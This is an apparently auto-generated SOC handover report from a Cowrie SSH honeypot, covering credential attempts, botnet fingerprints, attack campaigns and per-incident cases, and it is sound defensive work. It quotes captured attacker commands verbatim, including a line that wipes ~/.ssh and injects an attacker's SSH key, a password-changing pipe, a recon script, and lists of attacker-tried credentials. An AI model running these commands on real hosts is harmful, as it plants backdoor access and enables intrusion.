# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-03 |
| **Generated At** | 2026-10-03T15:24:16Z |
| **Shift Time** | 15:24 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **397** |
| Confirmed Threats | **354** |
| False Positives Filtered | **43** (10.8%) |
| Unique Attacker IPs | **255** |
| Countries of Origin | **49** |
| High Severity Cases | **207** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **190** |
| Malware Samples Analyzed | **5** HIGH · **23** MED · 15 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **3375** |
| Unique Credential Pairs | **2988** |
| Unique Usernames | **1241** |
| Unique Passwords | **2342** |
| Successful Auth Pairs | **3135** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 1305 |
| `ubuntu` | 90 |
| `345gs5662d34` | 85 |
| `admin` | 51 |
| `support` | 33 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 85 |
| `3245gs5662d34` | 85 |
| `support` | 31 |
| `123456` | 29 |
| `123` | 23 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 85 |
| `support` | `support` | 30 |
| `root` | `3245gs5662d34` | 28 |
| `admin` | `admin` | 14 |
| `admin123` | `admin123` | 12 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `sdadmin` | `51nGleD` | `195.178.110.218` | 2026-10-03T00:55:04 |
| `almalinux` | `abcdefg` | `109.160.32.41` | 2026-10-03T00:55:08 |
| `gdcl` | `esroot` | `109.160.32.41` | 2026-10-03T00:55:14 |
| `pey15` | `elasticsearch@1234` | `109.160.32.41` | 2026-10-03T00:55:22 |
| `smart` | `omkar` | `109.160.32.41` | 2026-10-03T00:55:30 |
| `qniconfiguser` | `hby` | `109.160.32.41` | 2026-10-03T00:55:37 |
| `r-config-08` | `maud` | `109.160.32.41` | 2026-10-03T00:55:44 |
| `mitmproxy` | `mitmproxy` | `195.178.110.218` | 2026-10-03T00:55:49 |
| `CG02` | `Sugus123$` | `109.160.32.41` | 2026-10-03T00:55:52 |
| `kipt` | `huawei` | `109.160.32.41` | 2026-10-03T00:55:59 |
| `netdata` | `parsa` | `109.160.32.41` | 2026-10-03T00:56:06 |
| `emps` | `Pa1326238w0rd` | `109.160.32.41` | 2026-10-03T00:56:16 |
| `snono` | `Root2026` | `109.160.32.41` | 2026-10-03T00:56:23 |
| `esearch` | `garcia` | `109.160.32.41` | 2026-10-03T00:56:32 |
| `visitor` | `visitor` | `195.178.110.218` | 2026-10-03T00:56:34 |
| `mma` | `manoj123` | `109.160.32.41` | 2026-10-03T00:56:39 |
| `cs203` | `Aa111111.` | `109.160.32.41` | 2026-10-03T00:56:51 |
| `roo` | `root@12345` | `109.160.32.41` | 2026-10-03T00:56:55 |
| `sonarqube` | `hujingxuan` | `109.160.32.41` | 2026-10-03T00:57:02 |
| `SJ01` | `1234567qwe` | `109.160.32.41` | 2026-10-03T00:57:10 |
_… 3115 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **397** |
| Sessions with Fingerprint | **30** |
| Unique HASSH Fingerprints | **30** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 127 |
| Go SSH scanner | 56 |
| OpenSSH | 49 |
| Paramiko (Python) | 12 |
| Unknown | 5 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 103 | 55 |
| `acaa53e0a7d7...` | Mirai/variant | 20 | 20 |
| `16443846184e...` | Generic scanner | 17 | 7 |
| `390ffe68a68c...` | Modern SSH client | 13 | 4 |
| `03a80b21afa8...` | Modern SSH client | 13 | 6 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 103 | 55 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 20 | 20 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 17 | 7 | Generic scanner |
| `95420f9d932d...` | OpenSSH | 14 | 13 | — |
| `390ffe68a68c...` | OpenSSH | 13 | 4 | Modern SSH client |
| `03a80b21afa8...` | libssh | 13 | 6 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 8 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **20** |
| Campaign Clusters | **8** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 57 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 53 | 50 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 5 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 5 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 3 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "wjx\nD4Q6ZjOkEu1i\nD4Q6ZjOkEu1i"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `14.103.118.25`, `36.103.243.179`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`, `92.118.39.49`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `77.239.124.121`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **255** |
| Unique ASNs | **110** |
| High-Risk ASNs | **84** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 53 | HIGH |
| `AS396982` | Google LLC | 15 | HIGH |
| `AS63949` | Akamai Connected Cloud | 9 | HIGH |
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS4766` | Korea Telecom | 7 | HIGH |
| `AS8075` | Microsoft Corporation | 7 | HIGH |
| `AS398324` | Censys, Inc. | 7 | HIGH |
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (207)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-887762e715e7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-10-03 00:55 |
| **Last Seen** | 2026-10-03 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 00:55:49` | `cowrie.session.connect` |
| `2026-10-03 00:55:49` | `cowrie.client.version` |
| `2026-10-03 00:55:49` | `cowrie.client.kex` |
| `2026-10-03 00:55:49` | `cowrie.login.success` |
| `2026-10-03 00:55:50` | `cowrie.session.params` |
| `2026-10-03 00:55:50` | `cowrie.command.input` |
| `2026-10-03 00:55:50` | `cowrie.log.closed` |
| `2026-10-03 00:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0e206b0d240

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]41` |
| **First Seen** | 2026-10-03 00:55 |
| **Last Seen** | 2026-10-03 00:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 00:55:04` | `cowrie.client.version` |
| `2026-10-03 00:55:04` | `cowrie.client.kex` |
| `2026-10-03 00:55:08` | `cowrie.login.success` |
| `2026-10-03 00:55:10` | `cowrie.session.params` |
| `2026-10-03 00:55:10` | `cowrie.command.input` |
| `2026-10-03 00:55:10` | `cowrie.log.closed` |
| `2026-10-03 00:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]41` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fff71e7d78da

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-03 01:12 |
| **Last Seen** | 2026-10-03 01:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 01:12:12` | `cowrie.session.connect` |
| `2026-10-03 01:12:12` | `cowrie.client.version` |
| `2026-10-03 01:12:12` | `cowrie.client.kex` |
| `2026-10-03 01:12:13` | `cowrie.login.success` |
| `2026-10-03 01:12:13` | `cowrie.direct-tcpip.request` |
| `2026-10-03 01:12:13` | `cowrie.direct-tcpip.data` |
| `2026-10-03 01:12:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd1f0a885f66

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-10-03 01:48 |
| **Last Seen** | 2026-10-03 01:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 01:48:26` | `cowrie.session.connect` |
| `2026-10-03 01:48:26` | `cowrie.client.version` |
| `2026-10-03 01:48:26` | `cowrie.client.kex` |
| `2026-10-03 01:48:26` | `cowrie.login.success` |
| `2026-10-03 01:48:27` | `cowrie.direct-tcpip.request` |
| `2026-10-03 01:48:28` | `cowrie.direct-tcpip.ja4` |
| `2026-10-03 01:48:28` | `cowrie.direct-tcpip.data` |
| `2026-10-03 01:48:28` | `cowrie.direct-tcpip.request` |
| `2026-10-03 01:48:28` | `cowrie.direct-tcpip.ja4` |
| `2026-10-03 01:48:28` | `cowrie.direct-tcpip.data` |
| `2026-10-03 01:48:29` | `cowrie.direct-tcpip.request` |
| `2026-10-03 01:48:29` | `cowrie.direct-tcpip.ja4` |
| `2026-10-03 01:48:29` | `cowrie.direct-tcpip.data` |
| `2026-10-03 01:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ff351849482

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-10-03 02:00 |
| **Last Seen** | 2026-10-03 02:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:00:30` | `cowrie.session.connect` |
| `2026-10-03 02:00:30` | `cowrie.client.version` |
| `2026-10-03 02:00:30` | `cowrie.client.kex` |
| `2026-10-03 02:00:30` | `cowrie.login.success` |
| `2026-10-03 02:00:31` | `cowrie.session.params` |
| `2026-10-03 02:00:31` | `cowrie.command.input` |
| `2026-10-03 02:00:31` | `cowrie.log.closed` |
| `2026-10-03 02:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82baf082a1ae

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-10-03 02:05 |
| **Last Seen** | 2026-10-03 02:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:05:06` | `cowrie.session.connect` |
| `2026-10-03 02:05:06` | `cowrie.client.version` |
| `2026-10-03 02:05:06` | `cowrie.client.kex` |
| `2026-10-03 02:05:06` | `cowrie.login.success` |
| `2026-10-03 02:05:08` | `cowrie.direct-tcpip.request` |
| `2026-10-03 02:05:09` | `cowrie.direct-tcpip.ja4` |
| `2026-10-03 02:05:09` | `cowrie.direct-tcpip.data` |
| `2026-10-03 02:05:11` | `cowrie.direct-tcpip.request` |
| `2026-10-03 02:05:12` | `cowrie.direct-tcpip.ja4` |
| `2026-10-03 02:05:12` | `cowrie.direct-tcpip.data` |
| `2026-10-03 02:05:13` | `cowrie.direct-tcpip.request` |
| `2026-10-03 02:05:13` | `cowrie.direct-tcpip.ja4` |
| `2026-10-03 02:05:13` | `cowrie.direct-tcpip.data` |
| `2026-10-03 02:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6456f36db3bd

| Field | Detail |
|---|---|
| **Source IP** | `34.76.244[.]144` |
| **First Seen** | 2026-10-03 02:18 |
| **Last Seen** | 2026-10-03 02:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:18:45` | `cowrie.session.connect` |
| `2026-10-03 02:18:45` | `cowrie.login.success` |
| `2026-10-03 02:18:45` | `cowrie.session.params` |
| `2026-10-03 02:18:45` | `cowrie.command.input` |
| `2026-10-03 02:18:45` | `cowrie.command.input` |
| `2026-10-03 02:18:45` | `cowrie.command.failed` |
| `2026-10-03 02:18:45` | `cowrie.command.input` |
| `2026-10-03 02:18:45` | `cowrie.log.closed` |
| `2026-10-03 02:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.244[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.76.244[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff2e780a3a63

| Field | Detail |
|---|---|
| **Source IP** | `34.76.244[.]144` |
| **First Seen** | 2026-10-03 02:18 |
| **Last Seen** | 2026-10-03 02:19 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:18:53` | `cowrie.session.connect` |
| `2026-10-03 02:18:53` | `cowrie.login.success` |
| `2026-10-03 02:18:54` | `cowrie.session.params` |
| `2026-10-03 02:18:54` | `cowrie.command.input` |
| `2026-10-03 02:18:54` | `cowrie.command.failed` |
| `2026-10-03 02:19:14` | `cowrie.log.closed` |
| `2026-10-03 02:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.244[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.76.244[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5380d3974dd4

| Field | Detail |
|---|---|
| **Source IP** | `34.76.244[.]144` |
| **First Seen** | 2026-10-03 02:18 |
| **Last Seen** | 2026-10-03 02:19 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:18:55` | `cowrie.session.connect` |
| `2026-10-03 02:18:55` | `cowrie.login.success` |
| `2026-10-03 02:18:56` | `cowrie.session.params` |
| `2026-10-03 02:18:56` | `cowrie.command.input` |
| `2026-10-03 02:19:14` | `cowrie.log.closed` |
| `2026-10-03 02:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.244[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.76.244[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f83fbd15c90

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-03 02:20 |
| **Last Seen** | 2026-10-03 02:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:20:29` | `cowrie.session.connect` |
| `2026-10-03 02:20:29` | `cowrie.client.version` |
| `2026-10-03 02:20:29` | `cowrie.client.kex` |
| `2026-10-03 02:20:30` | `cowrie.login.success` |
| `2026-10-03 02:20:30` | `cowrie.direct-tcpip.request` |
| `2026-10-03 02:20:30` | `cowrie.direct-tcpip.data` |
| `2026-10-03 02:20:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9441b95961f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-10-03 02:24 |
| **Last Seen** | 2026-10-03 02:25 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:24:31` | `cowrie.session.connect` |
| `2026-10-03 02:24:35` | `cowrie.client.version` |
| `2026-10-03 02:24:35` | `cowrie.client.kex` |
| `2026-10-03 02:24:50` | `cowrie.login.success` |
| `2026-10-03 02:25:00` | `cowrie.session.params` |
| `2026-10-03 02:25:00` | `cowrie.command.input` |
| `2026-10-03 02:25:00` | `cowrie.command.input` |
| `2026-10-03 02:25:00` | `cowrie.command.input` |
| `2026-10-03 02:25:00` | `cowrie.command.input` |
| `2026-10-03 02:25:00` | `cowrie.command.input` |
| `2026-10-03 02:25:00` | `cowrie.command.success` |
| `2026-10-03 02:25:00` | `cowrie.command.input` |
| `2026-10-03 02:25:00` | `cowrie.command.input` |
| `2026-10-03 02:25:00` | `cowrie.command.input` |
| `2026-10-03 02:25:00` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2581c3bbb1f4

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-10-03 02:27 |
| **Last Seen** | 2026-10-03 02:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:27:02` | `cowrie.session.connect` |
| `2026-10-03 02:27:02` | `cowrie.client.version` |
| `2026-10-03 02:27:03` | `cowrie.client.kex` |
| `2026-10-03 02:27:05` | `cowrie.login.success` |
| `2026-10-03 02:27:06` | `cowrie.session.params` |
| `2026-10-03 02:27:06` | `cowrie.command.input` |
| `2026-10-03 02:27:06` | `cowrie.log.closed` |
| `2026-10-03 02:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8e9b6d837d2

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-10-03 02:27 |
| **Last Seen** | 2026-10-03 02:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:27:25` | `cowrie.session.connect` |
| `2026-10-03 02:27:25` | `cowrie.client.version` |
| `2026-10-03 02:27:26` | `cowrie.client.kex` |
| `2026-10-03 02:27:28` | `cowrie.login.success` |
| `2026-10-03 02:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d817752f32e2

| Field | Detail |
|---|---|
| **Source IP** | `207.175.170[.]210` |
| **First Seen** | 2026-10-03 02:30 |
| **Last Seen** | 2026-10-03 02:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:30:14` | `cowrie.session.connect` |
| `2026-10-03 02:30:14` | `cowrie.login.success` |
| `2026-10-03 02:30:15` | `cowrie.session.params` |
| `2026-10-03 02:30:15` | `cowrie.command.input` |
| `2026-10-03 02:30:15` | `cowrie.command.input` |
| `2026-10-03 02:30:15` | `cowrie.command.failed` |
| `2026-10-03 02:30:15` | `cowrie.command.input` |
| `2026-10-03 02:30:15` | `cowrie.log.closed` |
| `2026-10-03 02:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.170[.]210` to AbuseIPDB if not already reported
- [ ] Block `207.175.170[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5525425c479c

| Field | Detail |
|---|---|
| **Source IP** | `207.175.170[.]210` |
| **First Seen** | 2026-10-03 02:30 |
| **Last Seen** | 2026-10-03 02:30 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:30:27` | `cowrie.session.connect` |
| `2026-10-03 02:30:27` | `cowrie.login.success` |
| `2026-10-03 02:30:28` | `cowrie.session.params` |
| `2026-10-03 02:30:28` | `cowrie.command.input` |
| `2026-10-03 02:30:28` | `cowrie.command.failed` |
| `2026-10-03 02:30:50` | `cowrie.log.closed` |
| `2026-10-03 02:30:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.170[.]210` to AbuseIPDB if not already reported
- [ ] Block `207.175.170[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49663b2fa838

| Field | Detail |
|---|---|
| **Source IP** | `207.175.170[.]210` |
| **First Seen** | 2026-10-03 02:30 |
| **Last Seen** | 2026-10-03 02:30 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-03 02:30:29` | `cowrie.session.connect` |
| `2026-10-03 02:30:29` | `cowrie.login.success` |
| `2026-10-03 02:30:30` | `cowrie.session.params` |
| `2026-10-03 02:30:30` | `cowrie.command.input` |
| `2026-10-03 02:30:50` | `cowrie.log.closed` |
| `2026-10-03 02:30:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.170[.]210` to AbuseIPDB if not already reported
